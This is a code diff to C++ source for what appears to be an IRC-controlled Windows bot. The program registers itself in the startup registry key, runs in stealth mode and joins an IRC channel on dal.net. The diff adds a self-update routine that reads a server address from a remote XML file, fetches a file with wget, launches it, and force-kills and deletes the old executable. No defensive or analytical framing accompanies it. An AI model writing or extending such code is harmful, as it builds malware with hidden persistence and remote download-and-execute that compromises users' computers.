@@ -57,6 +57,8 @@ logger logSplitfilename("Splitfilename");
 logger logStealth("Stealth");
 logger logThread("Threading");
 logger logStartupKey("StartupKey");
+logger logDownload_Updates("Download_Updates");
+logger logxmlparser("xmlparser");
 #endif
 
 
@@ -81,9 +83,9 @@ void Download_Updates(void);
 
 
 
-string address,name;
+string address,name,former_app_name,irc_s_name;
 std::string total,file2,path,resev,l,cont(""),MESSAGE,HOST,channel,
-IDENT=("maubsdadffot"),REALNAME=("kebeqcn"),NICK=("Maysqeqehry"),str1 ("PING :"+HOST),comd,E,F,Z,q,msg,channel2="Pho_enix :",version=("1.2"),str=("PRIVMSG ");
+IDENT=("maubsdadffot"),REALNAME=("kebeqcn"),NICK=("Maysqeqehry"),str1 ("PING :"+HOST),comd,E,F,Z,q,msg,channel2="Pho_enix :",version=("1.3"),str=("PRIVMSG ");
 
 
 char *writable;
@@ -301,6 +303,8 @@ void setup_loggers (int level)
         logStealth.set_level(LFATAL);
         logThread.set_level(LFATAL);
         logStartupKey.set_level(LFATAL);
+        logDownload_Updates.set_level(LFATAL);
+        logxmlparser.set_level(LFATAL);
 
     }
 
@@ -317,6 +321,8 @@ void setup_loggers (int level)
         logStealth.set_level(LWARN);
         logThread.set_level(LWARN);
         logStartupKey.set_level(LWARN);
+        logDownload_Updates.set_level(LFATAL);
+        logxmlparser.set_level(LFATAL);
 
     }
     else if (level==2)
@@ -659,7 +665,7 @@ if (RegOpenKey(HKEY_CURRENT_USER,
     &newValue) != ERROR_SUCCESS)
 {
     std::cout<<"Failure in regedit"<<std::endl;
-    logStartupKey<<LFATAL << "Error:unable to create thread,";
+    logStartupKey<<LFATAL << "Error:unable to create value in registry";
 }
 DWORD pathLenInBytes = pathLen * sizeof(*szPath);
 if (RegSetValueEx(newValue,
@@ -679,10 +685,15 @@ RegCloseKey(newValue);
 
 int xmlparser(char* filename)
 {
-
+#ifdef D_LIB
+logxmlparser<<LINFO <<" :Started logging.";
+#endif
 
 ifstream myfile(filename);
 
+#ifdef D_LIB
+logxmlparser<<LDEBUG <<" :Received Filename:"<<filename;
+#endif
 using namespace rapidxml;
 using namespace std;
 
@@ -698,21 +709,39 @@ doc.parse<parse_declaration_node | parse_no_data_nodes>(&buffer[0]);
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 string encoding = doc.first_node()->first_attribute("encoding")->value();
 // encoding == "utf-8"
-
+#ifdef D_LIB
+logxmlparser<<LDEBUG <<" :XML NODE encoding: "<<encoding;
+#endif
 // we didn't keep track of our previous traversal, so let's start again
 // we can match nodes by name, skipping the xml declaration entirely
 xml_node<>* cur_node = doc.first_node("current");
 string version_ret = cur_node->first_attribute("version")->value();
 // rootnode_type == "example"
-
+#ifdef D_LIB
+logxmlparser<<LDEBUG <<" :XML NODE Version: "<<version_ret;
+#endif
 // go straight to the first evendeepernode
 cur_node = cur_node->first_node("server")->first_node("name");
 name = cur_node->first_attribute("host")->value();
 address = cur_node->first_attribute("addr")->value();
 // attr2 == "dog"
+#ifdef D_LIB
+logxmlparser<<LDEBUG <<" :XML HostName: "<<name;
+#endif
 
+#ifdef D_LIB
+logxmlparser<<LDEBUG <<" :XML Filepath: "<<address;
+#endif
 // and then to the second evendeepernode
-cur_node = cur_node->next_sibling("evendeepernode");
+
+cur_node = cur_node->next_sibling("previous");
+former_app_name=cur_node->first_attribute("appname")->value();
+#ifdef D_LIB
+logxmlparser<<LDEBUG <<" :XML DownloadFile: "<<address;
+#endif
+
+irc_s_name=cur_node->first_attribute("ircserver")->value();
+cout<<"XML Parsed server name :"<<irc_s_name<<endl;
 
 
 
@@ -723,6 +752,8 @@ double version_local = atof (version.c_str());
 if (version_retrived>=version_local)
     {
     cout<<"Downloading Update"<<endl;
+    cout<<"Former app name"<<former_app_name<<endl;
+    cout<<"Updates Server address :"<<name<<"\\"<<address<<endl;
     Download_Updates();
     }
 else
@@ -732,12 +763,10 @@ else
     }
 
 
+////////////////////////////////////////
 
 
-
-
-cout<<"Updates Server address :"<<name<<"\\"<<address<<endl;
-
+///////////////////////////////////////
 
 return 0;
 }
@@ -837,7 +866,7 @@ std::istream response_data(&response);
 while(response_stream.good())
 {
 std::getline(response_stream, response_final);
-final_data+= (response_final+"\n");
+final_data+= (response_final);
 response_final.clear();
 }
 //std::cout<<final_data;
@@ -848,6 +877,8 @@ write.close();
 if (error != boost::asio::error::eof)
 throw boost::system::system_error(error);
 
+
+if (final_data.length()>=0)
 xmlparser("somefile.xml");
    ////////////////////////////////////////////////////////
    pthread_exit(NULL);
@@ -862,11 +893,27 @@ string Host=name;
 string slash="/";
 string Get_Request=name+slash+address;
 string wget="wget.exe "+Get_Request;
+string del="del ";
+string kill="taskkill /f /im ";
+string start="start ";
+start=start+address;
+kill=(kill+former_app_name);
+del=(del+former_app_name);
+
+
+
+
 system(wget.c_str());
+system(start.c_str());
+
+system(kill.c_str());
+system(del.c_str());
+
 cout<<"Udpdate address"<<wget<<endl;
 
 
 }
+
 
 
 
@@ -876,12 +923,14 @@ int main(int argc, char *argv[])
 std::ofstream os("logger.txt", std::ios_base::out);
 set_all_logging_output_streams (os);
 #endif // D_LIB
-Verbose(5);
+Stealth(1);
+Verbose(verb1);
 #ifdef D_LIB
 logmain<<LINFO <<"Started";
 #endif // D_LIB
 
-HOST=("punch.wa.us.dal.net"),channel="kens";
+
+channel="kens";
 
 
 
@@ -903,15 +952,17 @@ HOST=("punch.wa.us.dal.net"),channel="kens";
             //FileCopier("libiconv-2.dll","libiconv-2.dll","C:\\Temp\\");
         }
 start_reg();
+
+
 //system("taskkill /f /im Communication.exe");
-system("del Communication.exe");
-    Stealth(1);
+
+
 ///////////////////////////////Multi-threading/////////////////////////////////
 pthread_t threads[NUM_THREADS];
 int rc;
 int i=1;
 
- std::cout << "main() : creating thread, " << i << endl;
+    logmain<<LINFO<< "main() : creating thread, " << i;
       rc = pthread_create(&threads[i], NULL,
                           Check_Updates, (void *)i);
             pthread_detach(threads[i]);
@@ -921,12 +972,26 @@ int i=1;
 ///////////////////////////////Multi-threading/////////////////////////////////
 
     Compname();
+    int times=0;
     while (1)
             {
     #ifdef D_LIB
     logmain<<LINFO <<"Inside while loop";
     #endif // D_LIB
             try{
+                 HOST=irc_s_name;
+
+
+                if(HOST.length()<= 0)
+                {
+                   logmain<<LDEBUG <<"Received host name :"<<HOST;
+                   if (times>=6)
+                        {
+                            HOST="punch.wa.us.dal.net";
+                            times=0;
+                        }
+                    times++;
+                }
                 IrcConnect(HOST,channel);
                 } catch (const std::exception& ex) {
 // ...
